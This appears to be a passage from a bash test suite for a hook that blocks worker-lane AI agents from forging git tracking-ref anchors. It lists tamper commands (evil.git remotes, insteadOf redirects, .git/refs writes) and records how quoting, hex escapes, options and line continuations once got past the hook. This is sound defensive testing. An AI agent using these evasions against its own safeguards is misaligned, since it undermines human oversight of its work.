    "$(run_case "$(j_bash "git fetch '../evil.git' x:origin/main")" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper codex-6: double-quoted absolute-path remote" 2 \
    "$(run_case "$(j_bash 'git fetch "/tmp/evil.git" x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper codex-6: double-quoted dot remote via git push" 2 \
    "$(run_case "$(j_bash 'git push "." x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper codex-6: quoting composes with git -C <dir>" 2 \
    "$(run_case "$(j_bash 'git -C /some/dir fetch "." x:origin/main')" "HIMMEL_WORKER=1")"

# Bare-".." gap (same class as codex-6, found verifying the fix
# above rather than reported by the panel): the original alternation covered
# `.` bare but `..` only with a trailing `/…`, so `git fetch .. x:origin/main`
# — naming the PARENT directory as the remote, exactly as usable for anchor
# forgery as `.` — measured rc=0 ALLOW pre-fix. Fixed by adding a bare `\.\.`
# alternative alongside the existing `\.` one. Every row uses `x:origin/main`
# (not a refs/remotes/-bearing refspec) so a DENY here can only come from
# class (ii)'s remote-argument match, never a class (i) keyword hit on the
# refspec — see the double-quoted-dot-via-push row above, corrected to the
# same refspec after it was found to pass even pre-fix for that reason.
assert_rc "anchor-tamper HIMMEL-2528: bare .. remote" 2 \
    "$(run_case "$(j_bash 'git fetch .. x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper HIMMEL-2528: double-quoted .. remote" 2 \
    "$(run_case "$(j_bash 'git fetch ".." x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper HIMMEL-2528: single-quoted .. remote" 2 \
    "$(run_case "$(j_bash "git fetch '..' x:origin/main")" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper HIMMEL-2528: bare .. remote via git push" 2 \
    "$(run_case "$(j_bash 'git push .. x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper HIMMEL-2528: bare .. composes with git -C <dir>" 2 \
    "$(run_case "$(j_bash 'git -C /some/dir fetch .. x:origin/main')" "HIMMEL_WORKER=1")"

# The destination gate. Class (ii) used to match on the
# REMOTE argument, and that axis lost four times: quoted remotes (codex-6),
# bare `..`, then codex-3's bare relative directory names, then the CONFIGURED
# remote itself. The last two were both measured rc=0 ALLOW pre-fix:
# `git fetch evil.git x:origin/main`, `git fetch sub/dir x:origin/main`,
# `git fetch origin x:origin/main`. The fence now matches the refspec's
# DESTINATION instead, so the remote argument is no longer load-bearing and
# every row below denies for the same one reason.
#
# ISOLATION: each row's refspec destination is the `origin/main` SHORTHAND,
# never the `refs/remotes/` literal, so a DENY can only come from the new
# destination classifier — class (i)'s refs/remotes/ keyword cannot reach it.
# The two rows that DO carry the literal are labelled as such below.
assert_rc "anchor-tamper round 2: bare relative-directory remote" 2 \
    "$(run_case "$(j_bash 'git fetch evil.git x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: nested relative-directory remote" 2 \
    "$(run_case "$(j_bash 'git fetch sub/dir x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: the CONFIGURED origin remote forges too" 2 \
    "$(run_case "$(j_bash 'git fetch origin x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: double-quoted relative-directory remote" 2 \
    "$(run_case "$(j_bash 'git fetch "evil.git" x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: single-quoted nested-directory remote" 2 \
    "$(run_case "$(j_bash "git fetch 'sub/dir' x:origin/main")" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: backslash-escaped relative-directory remote" 2 \
    "$(run_case "$(j_bash 'git fetch \evil.git x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: quoted refspec on a configured remote" 2 \
    "$(run_case "$(j_bash "git fetch origin 'x:origin/main'")" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: configured remote via git push" 2 \
    "$(run_case "$(j_bash 'git push origin x:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: configured remote composes with git -C <dir>" 2 \
    "$(run_case "$(j_bash 'git -C /some/dir fetch origin x:origin/main')" "HIMMEL_WORKER=1")"

# Alternate spellings of an explicit destination that never occupy the refspec
# ARGUMENT slot at all — the refspec rides a flag or a -c config override, one
# before and one after the subcommand. The destination classifier scans the
# whole fetch/push/pull SEGMENT, so no per-flag rule is needed.
assert_rc "anchor-tamper round 2: --refmap=<spec> with a shorthand destination" 2 \
    "$(run_case "$(j_bash 'git fetch --refmap=+refs/heads/main:origin/main origin')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: --refmap <spec> with a shorthand destination" 2 \
    "$(run_case "$(j_bash 'git fetch --refmap +refs/heads/main:origin/main origin')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: -c remote.origin.fetch=<spec>, shorthand destination" 2 \
    "$(run_case "$(j_bash 'git -c remote.origin.fetch=+refs/heads/main:origin/main fetch origin')" "HIMMEL_WORKER=1")"

# Explicit refs/remotes/ destinations. These are pinned as PERMANENT regression
# rows, not as evidence for the destination gate: each also contains the
# refs/remotes/ literal, so class (i)'s keyword scan denies them independently
# and they pass even against the pre-fix hook. Labelled so no later reader
# mistakes them for isolating pins.
assert_rc "anchor-tamper round 2: explicit refs/remotes destination (also class (i))" 2 \
    "$(run_case "$(j_bash 'git fetch origin x:refs/remotes/origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: --refmap= wildcard refs/remotes (also class (i))" 2 \
    "$(run_case "$(j_bash 'git fetch --refmap=+refs/heads/*:refs/remotes/origin/* origin')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: -c wildcard refs/remotes (also class (i))" 2 \
    "$(run_case "$(j_bash 'git -c remote.origin.fetch=+refs/heads/*:refs/remotes/origin/* fetch origin')" "HIMMEL_WORKER=1")"

# scripts/propagate-public.sh:2274 and :2913 run exactly this shape. The DENY
# is CORRECT and deliberately unexempted: this hook only inspects Bash TOOL
# calls on a worker lane, and propagate-public.sh's own fetch is a child
# process of the script (never a tool call), so the script is unaffected. The
# only reachable case is a worker-lane agent typing the command out by hand,
# where refusing it is the intended behavior.
assert_rc "anchor-tamper round 2: propagate-public's tracking-ref fetch shape denied" 2 \
    "$(run_case "$(j_bash 'git -C /pub fetch -q origin refs/heads/b:refs/remotes/origin/b')" "HIMMEL_WORKER=1")"

# The `<a>/<b>` destination arm resolves <a> against the repo's actual remote
# set, so these two must keep denying for the RIGHT reason — `origin` is a
# remote in the fixture repo. They are the shape the whole inversion exists
# for; the `+` prefix on the second one also pins that a leading `+` on the
# SOURCE side does not shift where the destination is read from.
assert_rc "anchor-tamper round 2: HEAD:origin/main on a configured remote" 2 \
    "$(run_case "$(j_bash 'git push origin HEAD:origin/main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: +refs/heads/main:origin/main force-refspec" 2 \
    "$(run_case "$(j_bash 'git fetch origin +refs/heads/main:origin/main')" "HIMMEL_WORKER=1")"

# FAIL-CLOSED when the remote set cannot be established at all. CLAUDE_PROJECT_
# DIR points at a directory that is not a git repo, so `git remote` exits
# non-zero and the classifier cannot prove `feat/x` is a branch rather than a
# tracking ref — it denies. Deliberate direction: failing OPEN here would hand
# a bypass to any worker that could make the lookup fail, and
# HIMMEL_HOOK_INTEGRITY_BYPASS_OK covers the legitimate case. Non-vacuous by
# CONTRAST: this is the identical command to the feat/<slug> ALLOW row below,
# differing only in whether the remote set can be read.
NOT_A_REPO=$(mktemp -d -t glm-not-a-repo.XXXXXX)
assert_rc "anchor-tamper round 2: unrunnable git remote fails CLOSED" 2 \
    "$(run_case "$(j_bash 'git push origin HEAD:feat/x')" "HIMMEL_WORKER=1" "CLAUDE_PROJECT_DIR=$NOT_A_REPO")"

# ALLOW: ordinary git use on the same native worker lane stays unaffected.
assert_rc "anchor-tamper: plain git fetch origin allowed" 0 \
    "$(run_case "$(j_bash 'git fetch origin')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: plain git push to a named remote allowed" 0 \
    "$(run_case "$(j_bash 'git push origin feat/x')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: git status allowed" 0 \
    "$(run_case "$(j_bash 'git status')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: git log allowed" 0 \
    "$(run_case "$(j_bash 'git log --oneline -3')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: git commit allowed" 0 \
    "$(run_case "$(j_bash "git commit -m 'x'")" "HIMMEL_WORKER=1")"

# Read-only `git remote` inspection must survive the remove/rm/rename verbs
# added above — workers use these routinely and neither mutates anything.
assert_rc "anchor-tamper: bare git remote (listing) allowed" 0 \
    "$(run_case "$(j_bash 'git remote')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper: git remote -v allowed" 0 \
    "$(run_case "$(j_bash 'git remote -v')" "HIMMEL_WORKER=1")"

# codex-6 negative controls: anchor_unquote() only drops quote/escape
# characters, it never invents new ones — a quoted ORDINARY remote name still
# fails every bare-spelling alternative after normalization, and a commit
# message that merely CONTAINS a quoted "." in prose must not be reinterpreted
# as a refspec shape just because normalization ran over the whole line.
assert_rc "anchor-tamper codex-6: quoted ordinary remote name still allowed" 0 \
    "$(run_case "$(j_bash 'git fetch "origin" main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper codex-6: commit message quoting a dot stays allowed" 0 \
    "$(run_case "$(j_bash 'git commit -m "fix: normalize \". path"')" "HIMMEL_WORKER=1")"

# Bare-".." negative control: a bare ".." appearing OUTSIDE the
# remote-argument position of a fetch/push/pull (here, plain prose in a commit
# message) must not trip the new alternative — it only fires at the same
# command-position slot the rest of class (ii) already anchors on.
assert_rc "anchor-tamper HIMMEL-2528: commit message mentioning .. stays allowed" 0 \
    "$(run_case "$(j_bash 'git commit -m "see ../notes for detail"')" "HIMMEL_WORKER=1")"

# Negative controls. Inverting class (ii) from the remote
# argument to the refspec destination is exactly the change that over-blocks,
# so the ALLOW side is pinned as hard as the DENY side. The first three are the
# implicit-refspec forms: they DO update tracking refs, via the remote's
# configured default refspec, and they must stay allowed — carrying no explicit
# tracking destination in the command text is the whole discriminator.
assert_rc "anchor-tamper round 2: git fetch origin <branch> allowed" 0 \
    "$(run_case "$(j_bash 'git fetch origin main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: git fetch --all allowed" 0 \
    "$(run_case "$(j_bash 'git fetch --all')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: bare git pull allowed" 0 \
    "$(run_case "$(j_bash 'git pull')" "HIMMEL_WORKER=1")"
# An explicit refspec whose destination is NOT tracking space: a bare local
# branch name, and a fully-qualified refs/heads/ ref. Both must survive.
assert_rc "anchor-tamper round 2: explicit refspec to a bare local branch allowed" 0 \
    "$(run_case "$(j_bash 'git fetch origin main:main')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: explicit refs/heads destination allowed" 0 \
    "$(run_case "$(j_bash 'git push origin HEAD:refs/heads/feat-x')" "HIMMEL_WORKER=1")"

# himmel MANDATES `type/slug` branch names, so a slash-bearing DESTINATION is
# the single most common push shape in the repo — and it is the SAME two-
# segment shape as `origin/main`. These rows pin that the classifier tells them
# apart by resolving the first segment against the repo's real remote set:
# `feat`/`fix` are not remotes in the fixture repo, `origin` is. Measured, not
# assumed — remove the remote-set lookup (deny every `<a>/<b>`) and both go red
# at rc=2, which is this refinement's red control.
assert_rc "anchor-tamper round 2: push to a feat/<slug> branch allowed" 0 \
    "$(run_case "$(j_bash 'git push origin HEAD:feat/x')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: push to a fix/<slug> branch allowed" 0 \
    "$(run_case "$(j_bash 'git push origin HEAD:fix/x')" "HIMMEL_WORKER=1")"
# Labelled honestly: `main` has no slash, so this one never reaches the
# `<a>/<b>` arm at all — it pins the bare-destination arm and stays green under
# the red control above. Kept as the push-side twin of the fetch row further up.
assert_rc "anchor-tamper round 2: push main:main allowed (bare-destination arm)" 0 \
    "$(run_case "$(j_bash 'git push origin main:main')" "HIMMEL_WORKER=1")"
# scripts/propagate-public.sh:2608's operator-guidance text — the same fetch
# with NO explicit destination. Denying this one would be the over-block.
assert_rc "anchor-tamper round 2: propagate-public's implicit-refspec guidance allowed" 0 \
    "$(run_case "$(j_bash 'git -C /pub fetch origin b')" "HIMMEL_WORKER=1")"
# A commit message that merely CONTAINS a colon and a tracking-ref-looking
# string, and the same message chained after a real fetch: the destination scan
# is per command SEGMENT, so the fetch cannot borrow the commit's text.
assert_rc "anchor-tamper round 2: commit message naming origin/main allowed" 0 \
    "$(run_case "$(j_bash 'git commit -m "fix: origin/main drift"')" "HIMMEL_WORKER=1")"
assert_rc "anchor-tamper round 2: fetch chained with such a commit stays allowed" 0 \
    "$(run_case "$(j_bash 'git fetch origin; git commit -m "fix: origin/main drift"')" "HIMMEL_WORKER=1")"

# --- class (i) quoting bypass ------------------
# Class (ii) had anchor_unquote() while class (i) scanned RAW
# command text, so every class-(i) keyword walked through an ordinary shell
# quoting form. All 17 rows below measured rc=0 ALLOW against the pre-fix hook
# (628bd627) and rc=2 DENY after — the red control was the real normalization
# reverted (class (i) grepping anchor_cmd_lc again), never a stub.
#
# ISOLATION: each row carries EXACTLY ONE class-(i) keyword and no class-(ii)
# shape. None is a command-position fetch/push/pull, and the two rows that name
# tracking-ref paths break the `refs/remotes/` and `remotes/origin/` literals
# with the quote itself, so nothing else in the hook can produce the DENY.
assert_rc "class (i) quoting: double-quoted remote set-url" 2 \
    "$(run_case "$(j_bash 'git "remote" "set-url" origin /tmp/decoy')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: single-quoted set-url verb" 2 \
    "$(run_case "$(j_bash "git remote 'set-url' origin /tmp/decoy")" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: backslash-escaped set-url verb" 2 \
    "$(run_case "$(j_bash 'git remote se\t-url origin /tmp/decoy')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: adjacent-double-quote set-url verb" 2 \
    "$(run_case "$(j_bash 'git remote ""set-url"" origin /tmp/decoy')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: double-quoted remote add" 2 \
    "$(run_case "$(j_bash 'git "remote" "add" evil /tmp/d')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: single-quoted add verb" 2 \
    "$(run_case "$(j_bash "git remote 'add' evil /tmp/d")" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: backslash-escaped add verb" 2 \
    "$(run_case "$(j_bash 'git remote a\dd evil /tmp/d')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: double-quoted remove verb" 2 \
    "$(run_case "$(j_bash 'git remote "remove" origin')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: single-quoted rm verb" 2 \
    "$(run_case "$(j_bash "git remote 'rm' origin")" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: backslash-escaped rename verb" 2 \
    "$(run_case "$(j_bash 'git remote re\name origin old')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: double-quoted set-head verb" 2 \
    "$(run_case "$(j_bash 'git remote "set-head" origin evil')" "HIMMEL_WORKER=1")"
# symbolic-ref/update-ref split ACROSS the quote, and deliberately pointed at
# refs/heads/ and a bare shorthand so the refs/remotes/ keyword cannot fire.
assert_rc "class (i) quoting: symbolic-ref split by a quote" 2 \
    "$(run_case "$(j_bash 'git sym"bolic-ref" refs/heads/x refs/heads/y')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: update-ref split by a quote" 2 \
    "$(run_case "$(j_bash 'git up"date-ref" origin/main deadbeef')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: insteadOf split by a quote" 2 \
    "$(run_case "$(j_bash 'git config --global url.https://evil/.instead"Of" https://github.com/')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: remote.origin.url split by quotes" 2 \
    "$(run_case "$(j_bash 'git config remote."origin".url /tmp/decoy')" "HIMMEL_WORKER=1")"
# Not git commands at all — the direct .git/refs write the class exists to
# catch. These also pin that class (i) is deliberately NOT scoped to a
# git-command shape: scoping it there (one way to answer the overmatch note
# below) would silently drop exactly these.
assert_rc "class (i) quoting: refs/remotes path split by a quote" 2 \
    "$(run_case "$(j_bash 'echo deadbeef > .git/"refs/remotes"/origin/main')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: remotes/origin path split by a quote" 2 \
    "$(run_case "$(j_bash "printf x > .git/refs/'remotes/origin'/main")" "HIMMEL_WORKER=1")"

# ANSI-C ($'...') fail-closed arm, widened from class (ii)'s
# fetch/push/pull segment to any command-position git segment. anchor_unquote()
# does not decode escape bodies (a wrong decode risks a false ALLOW), so a body
# that spells a keyword out in hex survives normalization: both rows measured
# rc=0 ALLOW pre-fix. The second hides the SUBCOMMAND token itself, which is
# why the arm cannot be scoped to an enumeration of fenced subcommands.
assert_rc "class (i) ANSI-C: hex-encoded add verb" 2 \
    "$(run_case "$(j_bash "git remote \$'\\x61dd' evil /tmp/d")" "HIMMEL_WORKER=1")"
assert_rc "class (i) ANSI-C: hex-encoded remote subcommand" 2 \
    "$(run_case "$(j_bash "git \$'\\x72emote' add evil /tmp/d")" "HIMMEL_WORKER=1")"

# --- class (i) precondition for the destination gate -------------------------
# MECHANICAL coupling pin, not a comment. Class (ii)
# deliberately ALLOWS the implicit-refspec form `git fetch origin` — pinned
# just above as "anchor-tamper: plain git fetch origin allowed", and it must
# stay allowed. That makes class (i) the ONLY thing preventing the two-step
# anchor forgery below, and it once held for bare spellings alone:
# the whole chain measured rc=0 ALLOW against the pre-fix hook.
#
# Read these two rows together with that ALLOW row. If a future edit
# "simplifies" class (i) back to raw-text matching, these go red while every
# class-(ii) case stays green — which is the point. A DENY here can only come
# from the FIRST segment's class-(i) keyword: the second segment is the
# already-pinned ALLOW, so the chain has no other source of rc=2.
assert_rc "class (i) precondition for the destination gate: quoted set-url then implicit fetch" 2 \
    "$(run_case "$(j_bash "git remote 'set-url' origin /tmp/evil.git; git fetch origin")" "HIMMEL_WORKER=1")"
assert_rc "class (i) precondition for the destination gate: quoted remote add then fetch it" 2 \
    "$(run_case "$(j_bash 'git "remote" "add" decoy /tmp/evil.git && git fetch decoy')" "HIMMEL_WORKER=1")"

# ALLOW controls for the normalization. A quote-stripping change over-blocks
# easily, so the read-only `git remote` verbs are pinned individually — none of
# them is a fenced keyword before OR after normalization. `git remote` and
# `git remote -v` are pinned further up; these are the two that were missing.
assert_rc "class (i) quoting: git remote show origin allowed" 0 \
    "$(run_case "$(j_bash 'git remote show origin')" "HIMMEL_WORKER=1")"
assert_rc "class (i) quoting: git remote get-url origin allowed" 0 \
    "$(run_case "$(j_bash 'git remote get-url origin')" "HIMMEL_WORKER=1")"
# The ANSI-C arm is scoped to a command-position `git` segment, so ordinary
# ANSI-C quoting elsewhere is untouched.
assert_rc "class (i) ANSI-C: non-git command using \$'...' allowed" 0 \
    "$(run_case "$(j_bash "echo \$'a\\nb'")" "HIMMEL_WORKER=1")"

# ACCEPTED OVERMATCH, pinned as the two rows that CHANGED DIRECTION
# (rc=0 ALLOW pre-fix, rc=2 DENY now). Recorded honestly rather than argued
# away: class (i) is an unanchored substring scan, so a commit MESSAGE naming a
# fenced phrase already denied before this change in its UNQUOTED spelling.
# Normalization
# extends that same accepted cost to the quoted spelling; it does not create a
# new category of false positive, and no substring class can tell
# `git remote 'add' evil` from `-m "remote 'add'"` without being scoped to a
# git-command shape, which would drop the two .git/refs rows above.
assert_rc "class (i) accepted overmatch: commit message quoting a fenced verb" 2 \
    "$(run_case "$(j_bash "git commit -m \"the remote 'add' flow is fenced\"")" "HIMMEL_WORKER=1")"
assert_rc "class (i) accepted overmatch: commit message using \$'...'" 2 \
    "$(run_case "$(j_bash "git commit -m \$'a\\nb'")" "HIMMEL_WORKER=1")"

# --- options between `remote` and its verb -----
# `git remote` takes options BEFORE the subcommand, so `remote[[:space:]]+add`
# never saw the verb. All eight rows below measured rc=0 ALLOW against the
# pre-fix hook (ddd23b07) and rc=2 DENY after; the red control was the real
# tokeniser reverted to the six `remote[[:space:]]+<verb>` greps, never a stub.
#
# ISOLATION, checked per row and not in aggregate: none of these is a
# command-position fetch/push/pull (class (ii) cannot fire), none carries `$'`
# (the ANSI-C arm cannot fire), and none contains `refs/remotes/`,
# `remotes/origin/`, `symbolic-ref`, `update-ref`, `insteadof` or
# `remote.origin.url` (no other class-(i) keyword can fire). The ONLY thing
# that can produce rc=2 is the remote-verb tokeniser.
#
# One row per verb in the real fenced list, alternating the option spelling —
# the fix skips option TOKENS by shape (`-*`), so it is closed against whatever
# option git adds next; these rows pin the family, not the option.
assert_rc "class (i) remote options: -v before set-url" 2 \
    "$(run_case "$(j_bash 'git remote -v set-url origin /tmp/evil.git')" "HIMMEL_WORKER=1")"
assert_rc "class (i) remote options: --verbose before add" 2 \
    "$(run_case "$(j_bash 'git remote --verbose add evil /tmp/d')" "HIMMEL_WORKER=1")"
assert_rc "class (i) remote options: -v before remove" 2 \
    "$(run_case "$(j_bash 'git remote -v remove origin')" "HIMMEL_WORKER=1")"
assert_rc "class (i) remote options: --verbose before rm" 2 \
    "$(run_case "$(j_bash 'git remote --verbose rm origin')" "HIMMEL_WORKER=1")"
assert_rc "class (i) remote options: -v before rename" 2 \
    "$(run_case "$(j_bash 'git remote -v rename origin old')" "HIMMEL_WORKER=1")"
assert_rc "class (i) remote options: --verbose before set-head" 2 \
    "$(run_case "$(j_bash 'git remote --verbose set-head origin evil')" "HIMMEL_WORKER=1")"
# TWO options: pins that the fix SKIPS option tokens in a loop rather than
# tolerating exactly one — a one-token allowance would leave this open.
assert_rc "class (i) remote options: two options before add" 2 \
    "$(run_case "$(j_bash 'git remote -v --verbose add evil /tmp/d')" "HIMMEL_WORKER=1")"
# BOTH the quoting and the option axes at once: an intervening option AND a quoted
# verb. The quote normalizer alone does not reach it and the remote-verb tokeniser
# alone does not either — only both together deny.
assert_rc "class (i) remote options: --verbose before a quoted set-url" 2 \
    "$(run_case "$(j_bash "git remote --verbose 'set-url' origin /tmp/evil.git")" "HIMMEL_WORKER=1")"

# --- quote-evadable ANSI-C command anchor ------
# The ANSI-C arm must scan UNNORMALIZED text (anchor_unquote() strips the `'`
# the `$'` marker is made of), but it anchored on a LITERAL unquoted `git` at
# command position — so quoting the command token walked past both it and the
# normalized keyword scan. All four rows measured rc=0 ALLOW pre-fix.
#
# ISOLATION, per row: the ANSI-C body hides the verb from class (i) after
# normalization (`$'\x61dd'` normalizes to `$x61dd`, which is not `add`), and
# none is a fetch/push/pull, so class (ii) cannot fire either. The ONLY source
# of rc=2 is the ANSI-C arm reading a quote-stripped command token.
assert_rc "class (i) ANSI-C: double-quoted git with a split hex verb" 2 \
    "$(run_case "$(j_bash "\"git\" remote \$'\\x61'dd origin /tmp/evil.git")" "HIMMEL_WORKER=1")"
assert_rc "class (i) ANSI-C: single-quoted git command token" 2 \
    "$(run_case "$(j_bash "'git' remote \$'\\x61dd' evil /tmp/d")" "HIMMEL_WORKER=1")"
assert_rc "class (i) ANSI-C: backslash-escaped git command token" 2 \
    "$(run_case "$(j_bash "\\git remote \$'\\x72emove' origin")" "HIMMEL_WORKER=1")"
assert_rc "class (i) ANSI-C: quoted git at a chained segment position" 2 \
    "$(run_case "$(j_bash "true; \"git\" remote \$'\\x61dd' evil /tmp/d")" "HIMMEL_WORKER=1")"

# ALLOW controls. A tokeniser over-blocks easily, and the sharp
# edge is `git remote -v` with NO verb after it: that is a LISTING, not a
# metadata write. "First non-option token" yields nothing there, so nothing is
# compared against the verb list and the row stays allowed. `git remote`,
# `git remote -v`, `git remote show origin`, `git remote get-url origin`,
# `git status`, `git fetch origin` and `git push origin feat/x` are each pinned
# elsewhere in this file; these are the three added.
assert_rc "class (i) remote options: git remote --verbose (listing) allowed" 0 \
    "$(run_case "$(j_bash 'git remote --verbose')" "HIMMEL_WORKER=1")"
assert_rc "class (i) remote options: -v before a read-only verb allowed" 0 \
    "$(run_case "$(j_bash 'git remote -v show origin')" "HIMMEL_WORKER=1")"
# Stripping quotes off the COMMAND token must not deny quoted git per se — the
# ANSI-C arm still requires a `$'` in the rest of the segment.
assert_rc "class (i) ANSI-C: quoted git without \$'...' allowed" 0 \
    "$(run_case "$(j_bash '"git" status')" "HIMMEL_WORKER=1")"

# --- line continuations ------------------------
# The SEVENTH axis this fence's matching has been defeated on, and again closed
# by REMOVING the axis rather than enumerating its members. Bash deletes a
# backslash-newline pair before parsing, so `git remote \<newline>set-url origin
# /tmp/evil.git` really runs the plain `git remote set-url …` that measures
# rc=2. The hook flattened that newline to `;` BEFORE anything looked for the
# verb, so the remote-verb tokeniser saw a segment break exactly where the verb
# belonged, found none, and the write measured rc=0 ALLOW — one allowed command
# away from a forged anchor, since the follow-up `git fetch origin` is allowed
# by design. Fixed by joining continuations UPSTREAM of that flattening.
#
# All six DENY rows below measured rc=0 ALLOW against the pre-fix hook and rc=2
# after; the red control was the real join arm removed from the hook and then
# restored byte-identically (cmp), never a stub.
#
# ISOLATION, checked PER ROW and not in aggregate: none of the six is a
# command-position fetch/push/pull (class (ii) cannot fire), none carries `$'`
# (the ANSI-C arm cannot fire), none contains `refs/remotes/`,
# `remotes/origin/`, `symbolic-ref`, `update-ref`, `insteadof` or
# `remote.origin.url` (no other class-(i) keyword can fire), and run_case
# unsets HIMMEL_HOOK_INTEGRITY_DIR and ANTHROPIC_BASE_URL (neither the pin-dir
# class nor any other arm can fire). The ONLY thing that can produce rc=2
# is the remote-verb tokeniser reading a continuation-joined command.
ANCHOR_CR=$(printf '\r')
ANCHOR_CONT_SETURL=$(printf 'git remote \\\nset-url origin /tmp/evil.git')
assert_rc "class (i) continuation: LF continuation before set-url" 2 \
    "$(run_case "$(j_bash "$ANCHOR_CONT_SETURL")" "HIMMEL_WORKER=1")"
ANCHOR_CONT_ADD=$(printf 'git remote \\\nadd evil /tmp/d')
assert_rc "class (i) continuation: LF continuation before add" 2 \
    "$(run_case "$(j_bash "$ANCHOR_CONT_ADD")" "HIMMEL_WORKER=1")"
# A CRLF checkout puts the \r AFTER the backslash, so the backslash is no
# longer the last character of the record and a join that does not strip it
# never fires — the same spelling, the same fail-OPEN, one byte apart.
ANCHOR_CRLF_SETURL=$(printf 'git remote \\%s\nset-url origin /tmp/evil.git' "$ANCHOR_CR")
assert_rc "class (i) continuation: CRLF continuation before set-url" 2 \
    "$(run_case "$(j_bash "$ANCHOR_CRLF_SETURL")" "HIMMEL_WORKER=1")"
ANCHOR_CRLF_RENAME=$(printf 'git remote \\%s\nrename origin old' "$ANCHOR_CR")
assert_rc "class (i) continuation: CRLF continuation before rename" 2 \
    "$(run_case "$(j_bash "$ANCHOR_CRLF_RENAME")" "HIMMEL_WORKER=1")"
# The verb SPLIT ACROSS the continuation, not merely preceded by one: `se` +
# `t-url` is one token to bash and two fragments to anything that segments
# first. Token equality can only see it once the join has happened.
ANCHOR_CONT_SPLITVERB=$(printf 'git remote se\\\nt-url origin /tmp/evil.git')
assert_rc "class (i) continuation: the verb itself split across a continuation" 2 \
    "$(run_case "$(j_bash "$ANCHOR_CONT_SPLITVERB")" "HIMMEL_WORKER=1")"
# BOTH round-4's intervening-option axis and this one at once, with TWO
# continuations: the join must compose with the option-skipping loop, not
# replace it.
ANCHOR_CONT_OPTION=$(printf 'git remote \\\n-v \\\nset-url origin /tmp/evil.git')
assert_rc "class (i) continuation: two continuations around an intervening option" 2 \
    "$(run_case "$(j_bash "$ANCHOR_CONT_OPTION")" "HIMMEL_WORKER=1")"

# ALLOW controls. A continuation is ordinary shell formatting — only what it
# REASSEMBLES INTO may matter — so a multi-line command that joins to something
# harmless must stay rc=0. Without these the six rows above could be satisfied
# by denying every command that contains a backslash-newline at all.
ANCHOR_CONT_COMMIT=$(printf 'git commit -m "chore: bump the pin \\\nand refresh the ledger"')
assert_rc "class (i) continuation: multi-line git commit -m stays allowed" 0 \
    "$(run_case "$(j_bash "$ANCHOR_CONT_COMMIT")" "HIMMEL_WORKER=1")"
ANCHOR_CONT_ECHO=$(printf 'echo checking the anchor \\\n  && echo done')
assert_rc "class (i) continuation: echo split across a continuation stays allowed" 0 \
    "$(run_case "$(j_bash "$ANCHOR_CONT_ECHO")" "HIMMEL_WORKER=1")"
# PARITY, the direction the join can get WRONG. Two trailing backslashes are an
# escaped literal backslash: the line really ENDS and bash runs two commands.
# Joining there would erase a real boundary and the second command would stop
# being a command-position fetch — class (ii) would go blind, a fail-OPEN
# manufactured by the fix itself. rc=2 here comes from class (ii) seeing
# `git fetch . x:origin/main` at command position, which is the whole assertion;
# its red control is the odd/even test replaced by "any trailing backslash".
ANCHOR_CONT_EVEN=$(printf 'echo x\\\\\ngit fetch . x:origin/main')
assert_rc "class (i) continuation: an even trailing run keeps the command boundary" 2 \
    "$(run_case "$(j_bash "$ANCHOR_CONT_EVEN")" "HIMMEL_WORKER=1")"

# CONTROL: a headed operator session (neither marker set) never reaches
# worker_lane at all — a DENY-shaped command must ALLOW there.
assert_rc "anchor-tamper: DENY-shaped command allowed off-lane (headed session)" 0 \
    "$(run_case "$(j_bash 'git fetch . x:origin/main')")"

# The bypass no longer lets a DENY-shaped command through outside a
# linked worktree (positive controls: test-block-worker-bypass-scope.sh).
assert_rc "anchor-tamper: DENY-shaped command STILL denied under the bypass outside a linked worktree (HIMMEL-3396)" 2 \
    "$(run_case "$(j_bash 'git fetch . x:origin/main')" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_BYPASS_OK=1")"

if [ "$FAILED" -ne 0 ]; then
